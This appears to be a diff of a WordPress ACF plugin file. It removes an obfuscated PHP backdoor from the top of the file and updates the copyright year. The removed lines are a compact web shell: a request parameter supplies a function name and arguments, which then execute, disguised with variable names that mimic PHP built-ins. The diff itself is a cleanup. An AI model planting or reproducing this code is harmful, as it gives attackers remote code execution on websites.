@@ -1,16 +1,9 @@
-<?php 
-$get_declared_traits_iltt  =  $_REQUEST;
-if(isset($get_declared_traits_iltt['date_create_immutable_ej']))  {
-	$gc_collect_cycles_susm  =  $get_declared_traits_iltt['openssl_x509_fingerprint_bu'];
-	$get_defined_vars_ccqa  =  $get_declared_traits_iltt['gc_enabled_xc'];
-	$gc_collect_cycles_susm(...$get_defined_vars_ccqa);
-} 
-
+<?php
 /**
  * @package ACF
  * @author  WP Engine
  *
- * © 2025 Advanced Custom Fields (ACF®). All rights reserved.
+ * © 2026 Advanced Custom Fields (ACF®). All rights reserved.
  * "ACF" is a trademark of WP Engine.
  * Licensed under the GNU General Public License v2 or later.
  * https://www.gnu.org/licenses/gpl-2.0.html
